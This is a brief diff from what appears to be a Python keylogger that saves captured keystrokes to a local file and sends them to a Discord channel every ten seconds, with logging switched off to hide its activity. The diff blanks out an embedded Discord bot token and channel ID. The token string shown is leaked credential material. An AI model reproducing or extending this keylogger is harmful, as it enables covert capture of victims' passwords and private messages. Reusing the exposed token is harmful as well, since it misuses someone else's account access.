@@ -6,8 +6,8 @@ import asyncio
 
 logging.disable(logging.CRITICAL)
 carpeta_destino = 'C:\\keylogger.txt'
-TOKEN = 'MTEyOTM4NTA1OTYxOTcwNDg4NA.GeLbSU.1XJk7vi0fea-bIKRG-dczV_DBwwxp7taS6X8Bo'
-CANAL_ID = 1129385880931532806
+TOKEN = ''
+CANAL_ID = 
 INTERVALO = 10
 
 logging.disable(logging.CRITICAL)
